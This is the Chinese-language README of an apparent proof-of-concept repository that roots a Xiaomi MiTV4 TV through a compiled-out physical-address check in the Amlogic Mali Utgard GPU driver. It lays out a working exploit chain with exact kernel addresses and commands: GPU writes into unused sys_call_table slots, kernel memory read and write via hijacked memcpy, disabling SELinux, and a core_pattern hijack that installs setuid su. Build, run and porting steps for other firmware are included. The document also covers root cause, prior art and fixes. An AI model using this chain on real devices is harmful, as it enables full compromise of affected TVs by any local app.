# MiTV4（Amlogic Utgard）—— 外部内存绑定缺少物理地址校验导致的本地提权

[English](README.md) | **简体中文**

一条在 **小米电视 MiTV4**（Amlogic S905L2，Mali-400，Utgard DDK）上经过实测验证的完整链路：
从无特权的 `adb shell`（uid 2000，`u:r:shell:s0`）拿到 `uid=0` 并让 SELinux 变为 permissive。

内核侧总共只改动 **132 字节**（`128 + 4`）。没有 ROP、没有堆喷、没有 KASLR bypass、没有使用 CVE。

> **运行前请先读最后一节的范围声明与免责声明。**

---

## 1. 一句话概括

```
# sys_call_table[244..259] 是 16 个连续的空槽位（原本全是 sys_ni_syscall，没人调用）。
# 一次 GPU 写把这 16 个槽位全部填成同一个函数地址，内核随后就会把 244 号系统调用
# 直接派发进去（arm64：表项 8 字节，参数在 x0..x5，返回值在 x0；本 SoC 没有 PAN，
# 所以内核可以直接读我们用户态的字符串和缓冲区）。

gpu_arb_write 1f6f7a0 ffffffc00111f308   # 槽位 -> kallsyms_lookup_name
kfunc sym memcpy                          # -> 0xffffffc0013e75c0   （这就是解析器）

gpu_arb_write 1f6f7a0 <memcpy>            # 槽位 -> memcpy
kfunc zero   <selinux_enforcing> 4        # SELinux -> permissive
kfunc str    <core_pattern> "|/data/local/tmp/roothelper.sh"
# 触发一次 coredump -> 内核以 root 身份执行该脚本
```

`run.sh` 做的就是这件事；除了一个地址之外，其余全部在运行期解析。

---

## 2. 受影响的设备

### 2.1 已验证的机型

| 项 | 值 |
|---|---|
| 型号 | 小米电视 **MiTV4-ANSM0 / L50M5-AD**，product `xmen` |
| 系统 | Android 6.0.1，build `21.11.13.2897` |
| 内核 | Linux **3.14.29**，arm64（aarch64），构建于 2021-11-13，`#1 SMP PREEMPT` |
| SoC / GPU | Amlogic **S905L2**，Mali-400，Utgard DDK **r6p1** |
| 内存 | 1 GB，线性映射 `va = phys + 0xffffffc000000000` |
| 缓解措施 | 无 KASLR、**无 PAN**；有 PXN；`panic_on_oops=1`；无 seccomp/userns/bpf |
| 节点权限 | `/dev/mali` 与 `/dev/ion` 均为 `crw-rw-rw-`（0666） |

### 2.2 其他设备受影响的条件

同时满足以下三条即受影响：

1. 使用 **Amlogic 派生版 Utgard 驱动**，且其中 `mali_mem_validation_check()`
   被编译成 `return _MALI_OSK_ERR_OK`（见第 3 节——这是 Amlogic 的改动，
   不是 Arm 上游代码）；
2. `/dev/mali` 对攻击者所在域可访问（本机是 0666 ⇒ **任何普通 app**，
   不需要 `shell`）；
3. 内核处于 GPU 的 DMA 可达范围内（没有被 TZASC / IOMMU 隔离）。

"内核 3.14 + 32 位用户态"与手法本身无关，但请注意第 5.2 节的
**64 位 / 32 位系统调用表差异**，这一点很关键。

---

## 3. 根因：物理地址校验被编译掉了

Amlogic 发布树中的 `utgard/<版本>/common/mali_mem_validation.c`：

```c
_mali_osk_errcode_t mali_mem_validation_check(u32 phys_addr, u32 size)
{
#if 0
	/* 针对 mali_mem_validator（framebuffer 范围）的真实范围校验 */
	...
	return _MALI_OSK_ERR_OK;
	return _MALI_OSK_ERR_FAULT;
#else
	return _MALI_OSK_ERR_OK;      /* <-- 什么都接受 */
#endif
}
```

调用链（全驱动只有一个调用者）：

```
用户态 ioctl(MALI_IOC_MEM_BIND, flags |= BACKEND_EXTERNAL_MEMORY, phys_addr = X)
  -> _mali_ukk_mem_bind()                    linux/mali_memory_manager.c
  -> mali_mem_bind_ext_buf(..., X, ...)      linux/mali_memory_external.c
  -> mali_mem_validation_check(X, size)      -> 永远返回成功
  -> mali_mmu_pagedir_update(session->page_directory, virt, X, size, DEFAULT)
```

也就是说 `X` 被直接写进了 GPU 页目录：用户态因此获得对**任意物理页**的 GPU 读写能力。

### 3.1 这是谁的缺陷？（是 Amlogic，不是 Arm）

这一点决定了影响面怎么写，所以要说准确：

| 代码树 | `mali_mem_validation_check` |
|---|---|
| Amlogic 发布的 `kernel/amlogic-tv-modules/mali-driver`，Utgard **r5p1 / r6p1 / r7p0 / r10p0** | 被 `#if 0` 关闭 |
| 独立仓库中标称**原始导入**的 Utgard **r6p1**（[`superna9999/meson_gx_mali_450`](https://github.com/superna9999/meson_gx_mali_450/blob/391322531863c8b6c719ba7f3e832afb9999ccd3/driver/src/devicedrv/mali/common/mali_mem_validation.c)）| **保留完整校验** |

两份文件的版权头都写着 ARM，所以"看版权头"本身证明不了任何事。
回归出在 **Amlogic 派生版本**，且仅在那里。

另外，`mali_mem_validation_add_range()` 在整个驱动里只有一个调用点
（`common/mali_kernel_core.c`，注册 framebuffer 范围）——即使把校验打开，
它也只会放行 framebuffer 那一小段。

参考：
- Amlogic 发布提交：<https://android.googlesource.com/kernel/amlogic-tv-modules/mali-driver/+/7c6e2c22d0cb0e39e969e39bdc0398a2c2f205d9>
- r6p2 里同样的缺陷：<https://android.googlesource.com/kernel/amlogic-tv-modules/mali-driver/+/refs/tags/android-tv-10.0.0_r0.1/utgard/r6p2/common/mali_mem_validation.c>

---

## 4. 写原语（这一段才是工程量所在）

只有"映射"还不够，还需要**可控地写**。Utgard 的 PP（pixel processor）
可以由我们自己构造的命令缓冲来驱动，它的 write-back 阶段会把片元颜色写进渲染目标。

`src/gpu_arb_write.c` 用 ion 分配命令缓冲，通过 `MALI_IOC_MEM_BIND`（DMA_BUF 后端）
绑到 `CMD_VA`，填入 5 条指令的片元着色器与渲染目标描述符，再把**目标物理页**
用 external 后端绑到 `EXT_VA`，最后提交一次 `MALI_IOC_PP_START_JOB`（408 字节）。

真正起作用的是 job 偏移 168 处的描述符：

```c
put32(job, 168, 0x02);                     /* 类型：write-back */
put32(job, 172, EXT_VA + (phys & 0xfff));  /* 目标地址 */
put32(job, 176, pixel_format);             /* 这一笔的宽度 */
```

### 4.1 `pixel_format` 标定（上机实测）

每次 job 固定写 **32 个像素**，字节宽度由格式决定：

| `pixel_format` | 写入字节数 | 内容 |
|---|---|---|
| **0x06** | **128** | 同一个 8 字节值按字节序重复 16 次 |
| 0x08 | 64 | 低 32 位重复 16 次 |
| 0x03 / 0x0f | 64 | 单个 32 位值（由常量重排得到）|
| 0x00,01,02,05,07,0e | 32 | 单个 32 位值（抖动图案）|
| **0x09,0a,0b,0c** | **16** | **全零** |
| 0x04 / 0x0d | 16 | 0x44444444 / 0x33333333 |

另外几条实测事实：

- `pixel_format` 只有**低 4 位**有效（`0x06 ≡ 0x16 ≡ 0x26`）；
- `wh` 字段（`(0x400<<16)|0x400`）对 footprint **完全没有影响**（测了 7 个值）——
  32 像素的突发长度是固定的；
- **没有 4 字节或 8 字节的粒度**，最小就是 16 字节；
- `0x06` 的落点**精确**（请求 `+0x40` ⇒ 变化区间 `0x40..0xbc`），
  `0x09` 也是精确的 16 字节且无外溢；
- PoC 启动时会先在自己的 ion 页上标定，如果实测 footprint 不是
  "恰好 128 字节、从请求地址开始"，就中止、不碰目标地址。

### 4.2 缓存一致性——这里有个坑

- **冷数据**（`lease_break_time`、`core_pattern`、`sys_call_table`）：
  GPU 的 DMA 写**立即生效**；
- **热变量**（`selinux_enforcing`、`panic_on_oops`，每次权限判定都会读、常驻 CPU cache）：
  GPU 直写**完全无效**——`getenforce` 一直是 `Enforcing`，因为 CPU 一直在用缓存里的旧值。

所以最后一步必须是**CPU 视角的写**（通过被劫持的 `memcpy`），不能用 GPU 写。
这一点当时花了好几个小时，别忽略。

---

## 5. 从"任意物理写"到"任意内核读写"

### 5.1 `sys_call_table` 里有 16 个空槽位

本内核的 `sys_call_table` 是 **8 字节**表项（arm64）。
`[244..259]` 这 16 个连续槽位全是 `sys_ni_syscall`——即"未实现"、没人调用。

本固件中 `sys_call_table[244]`：

```
虚拟地址 = 0xffffffc001f6f000 + 244*8 = 0xffffffc001f6f7a0
物理地址 = 0x1f6f7a0                       （本机 .data 漂移为 0x4000）
```

一次 `gpu_arb_write` 写 128 字节 = 正好覆盖这 16 个表项，且停在表边界——不溢出。

> 准确性说明：从 flash dump 恢复的 2022 版 vmlinux 里 `[278..293]` 是 `0x0`，
> 但在这台 2021 固件上调用 278 号返回 `-EPERM`，说明它**不是**可用的空槽。
> 只有 `[244..259]` 经过实测。

### 5.2 命中哪张表取决于调用者的位数

| 调用者 | 使用的表 | 位置 |
|---|---|---|
| 32 位进程 | `compat_sys_call_table` | **`.text`**（`0xffffffc00108d000`）|
| **64 位进程** | `sys_call_table` | **`.data`**（`0xffffffc001f6f000`）|

所以负责"调内核函数"的那个 helper **必须是 64 位**二进制。这台设备虽然用户态
只有 32 位，但能正常运行静态 aarch64 程序；如果你的设备不行，就只能去改
`.text` 里的 `compat_sys_call_table`（那是另一个问题：漂移 + icache）。

GPU 写那个 helper 可以保持 32 位（它只碰 `.data`，而且 ion 的 ioctl 结构体在
32/64 位下布局本来就不同）。

### 5.3 用一个符号解析器来 bootstrap

`kallsyms_lookup_name(const char *name)` 返回符号地址。把它的地址放进槽位后，
`syscall(244, "符号名")` 就能解析任何符号：

```
kfunc sym commit_creds        -> 0xffffffc0010c8df0   （与 vmlinux 完全一致）
kfunc sym selinux_enforcing   -> 0xffffffc0021697bc
kfunc sym memcpy              -> 0xffffffc0013e75c0   （vmlinux 是 0x13e76b0，漂移 -0xf0）
```

这就是为什么整条链只需要**一个**固件相关常量：`kallsyms_lookup_name` 本身。
下游全部（包括漂移不为 0 的 `memcpy`）都由内核自己解析。

### 5.4 任意内核读写

把槽位换成 `memcpy` 后，这个系统调用就变成了 memcpy：

```
kfunc show 0xffffffc0021697b0 32   # memcpy(用户, 内核, n)  -> 读内核
kfunc zero 0xffffffc0021697bc 4    # memcpy(内核, 用户, n)  -> 写内核
```

SELinux 全局变量写入前后的回读见第 6 节。

---

## 6. 关掉 SELinux

本固件解析出的地址：

| 符号 | 地址 |
|---|---|
| `avc_callbacks` | `0xffffffc0021697b0` |
| `selinux_secmark_refcount` | `0xffffffc0021697b8` |
| **`selinux_enforcing`** | **`0xffffffc0021697bc`** |
| `sel_inode_cache` | `0xffffffc0021697c0` |
| `default_noexec` | `0xffffffc0021697c8` |

```
kfunc zero 0xffffffc0021697bc 4     # CPU 视角的 4 字节写
```

```
写入前：... 00000000 01000000 003f1000c0ffffff ...   （enforcing = 1）
写入后：... 00000000 00000000 003f1000c0ffffff ...   （enforcing = 0，sel_inode_cache 完好）
getenforce -> Permissive
```

> 还有一个不需要解析器的备选：用 16 字节全零突发（`pixel_format 0x09`）
> 对准 `avc_callbacks`（= `enforcing - 0xC`），正好覆盖
> `avc_callbacks(8) + secmark_refcount(4) + enforcing(4)`，并在
> `sel_inode_cache` 前一个字节停下，不碰任何 `kmem_cache` 指针。
> 但因为第 4.2 节的缓存原因它对 `selinux_enforcing` 无效，所以最终走的是 CPU 写。

---

## 7. 拿到 root

SELinux 变成 permissive 之后，内核的 core-dump pipe helper 就是一个 root 执行器
（`core_pattern` 这条路上没有 LSM 前置检查）：

```
kfunc str <core_pattern> "|/data/local/tmp/roothelper.sh"
# 在 RLIMIT_CORE 已设置的情况下崩溃一个进程
```

`roothelper.sh` 会以 `uid=0`、`context=u:r:kernel:s0` 运行。具体内容见该文件：
它会装一个 setuid 的 `su`，并让 adb 在重启后仍然可连。

另一条不依赖 `core_pattern` 的路（也验证过）：把槽位指向 `prepare_kernel_cred`，
拿到它返回的 root cred 指针，再把槽位指向 `commit_creds` 并调用它。
**注意不要跨进程复用那个 cred 指针**——`exit_creds()` 会把引用计数降到 0 释放掉，
再用就是 use-after-free。

---

## 8. 编译与运行

```sh
# 32 位 helper（ion + mali 写引擎）
arm-linux-gnueabihf-gcc -O1 -static -o gpu_arb_write src/gpu_arb_write.c
# 64 位 helper（滥发系统调用表槽位）
aarch64-linux-gnu-gcc  -O1 -static -o kfunc          src/kfunc.c

# 或者用 zig 当交叉编译器：
make zig

adb push gpu_arb_write kfunc run.sh roothelper.sh /data/local/tmp/
adb shell 'cd /data/local/tmp && chmod 755 gpu_arb_write kfunc run.sh roothelper.sh && ./run.sh'
```

如果固件不同，`run.sh` 支持两个覆盖变量：

```sh
KLN_ADDR=ffffffc00...   # 你的内核里 kallsyms_lookup_name 的地址
SLOT_PHYS=1f6f7a0       # sys_call_table[244] 的物理地址
```

在陌生固件上恢复这两个值，是本 PoC 唯一没有自动化的部分，见第 10 节。

---

## 9. 已有先例，以及本仓库真正新增的是什么

### 9.1 这个手法已经公开

**RIPMaliUtgard / kort**（作者 Luke / lr-m）公开了同一条核心路径——
外部物理页绑定、手工配置 PP/write-back、覆盖内核函数指针：

- 首次提交 **2026-02-16** — <https://github.com/lr-m/RIPMaliUtgard/commit/4dec3d8783c30864a4fdc8ad1620598236bce8c4>
- 移植到新版驱动路径 **2026-02-19** — <https://github.com/lr-m/RIPMaliUtgard/commit/1f55bfae18d730ba3de032392a6d9e190ff01455>
- 仓库 — <https://github.com/lr-m/RIPMaliUtgard>

作者 2026-03-01 的文章讨论了 r6p2+ 的 `MEM_BIND / bind_ext_memory`，
其引用的 r6p2 源码里同样是 `#if 0`。仓库与文章都没有标注 CVE。

所以：**这条路径和根因都不是我们首先发现的。** 本仓库增加的是
"在一个具体产品上的实测实例"以及下面这些差异。

### 9.2 值得核对的差异

| # | 差异 |
|---|---|
| 1 | 把**未使用的 `sys_call_table` 槽位**当作通用的内核函数调用原语，并指出 32 位/64 位分别走 `compat_sys_call_table`（在 `.text`）与 `sys_call_table`（在 `.data`） |
| 2 | 用 **`kallsyms_lookup_name` 做 bootstrap 解析器**，再把同一批槽位换成 `memcpy` 获得任意内核读写——因此整条链只需要一个固件相关常量 |
| 3 | 第 4.1 节的 **`pixel_format` 宽度表**（最小 16 字节、`wh` 无关、落点精确）|
| 4 | 第 4.2 节的**缓存一致性差异**（冷数据 GPU 写有效；热变量必须 CPU 写）|

### 9.3 相关但**不是**这个缺陷的 CVE

| CVE | 为什么不是 |
|---|---|
| [CVE-2022-36449](https://nvd.nist.gov/vuln/detail/CVE-2022-36449) | Midgard/Bifrost/Valhall（**kbase**）的 use-after-free / 越界写 / 映射信息泄露；未列 Utgard |
| [CVE-2022-34830](https://nvd.nist.gov/vuln/detail/CVE-2022-34830) | Utgard 的 **TOCTOU 竞态导致 UAF**；不是"直接放行任意物理地址绑定" |

截至 2026-10-27，没有找到与本根因对应的 CVE，本仓库也不主张存在。
是否曾经有人私下提交过，需要 CNA 查重。

GPU 辅助内核利用这个方向的背景资料：
[PhantomMap（NDSS 2025）](https://www.ndss-symposium.org/ndss-paper/phantommap-gpu-assisted-kernel-exploitation/)、
以及 DEF CON SG 的
[Finding a Generic Mali GPU Read/Write Primitive](https://media.defcon.org/DEF%20CON%20SG%201/DEF%20CON%20SG%201%20main%20stage%20presentations/Shuquan%20Zhou%2C%20Guang%20Gong%2C%20Jun%20Yao%20-%20Finding%20a%20Generic%20Mali%20GPU%20Read-Write%20Primitive%20for%20Real-World%20Exploit%20Development.pdf)。

---

## 10. 移植到其他固件的提示

只有两个未知量，且都是每个构建固定的：

1. **`kallsyms_lookup_name`** —— bootstrap 地址。
   没有符号表时：它位于 `.text` 靠前位置，漂移通常为 0。本机上它就等于
   vmlinux 里的值（`0xffffffc00111f308`）。
2. **`sys_call_table`** —— 即 `sys_call_table + 244*8`，减去
   `0xffffffc000000000` 得到物理地址。

在新构建上找候选槽位的一个便宜办法：解析**随固件发布的** vmlinux
（或 boot 镜像 dump），找最长的一段 `sys_ni_syscall`；然后在运行期用一次无害调用确认，
例如把 `kallsyms_lookup_name` 放进去、解析一个你已经知道地址的符号。
槽位猜错会直接 panic，所以务必先离线确认。

---

## 11. 修复建议

对维护这类代码树的厂商：

- 重新启用 `mali_mem_validation_check()`（并注册应该允许的范围）；或者
- 除非是高特权调用者，否则直接拒绝 external memory 后端；并且
- 收紧设备节点：`/dev/mali` 是 0666 意味着**任何 app** 都能利用。

对受影响设备的用户：没有用户侧修复办法——校验是编译进内核的。
要么不要让不可信 app 装在这台设备上，要么使用修好的固件。

---

## 12. 范围、合法性与免责声明

- 发布目的是**对你拥有的硬件做研究与维修**。它需要一个已经具备的特权立足点
  （`adb shell`，也就是设备本来就在你手上），或者本机安装的一个 app；
  它不是远程漏洞。
- 底层手法**已经公开**（见 9.1）。本仓库不主张新的漏洞类别，也不主张任何 CVE。
- 地址只对应一个固件构建。在别的构建上运行**极可能让内核 panic**
  （本机 `panic_on_oops=1` ⇒ 直接重启）。
- 部分步骤会改动 `/system`（setuid `su`）和持久属性。回滚：
  `mount -o rw,remount /system && rm /system/xbin/su`，以及
  `setprop persist.adb.tcp.port ""`。
- 不提供任何担保，风险自负。

---

## 13. 文件说明

| 文件 | 目标架构 | 作用 |
|---|---|---|
| `src/gpu_arb_write.c` | armv7 | 通过 Utgard write-back 单元向任意物理地址写 128 字节 |
| `src/kfunc.c` | aarch64 | 通过未使用的 `sys_call_table` 槽位调用内核函数 |
| `run.sh` | — | 驱动整条链 |
| `roothelper.sh` | — | 由 `core_pattern` 以 root 运行；安装 `su`、修好 adb |
| `Makefile` | — | 构建，含 `zig` 目标 |

## 14. 许可证

MIT —— 见 `LICENSE`。
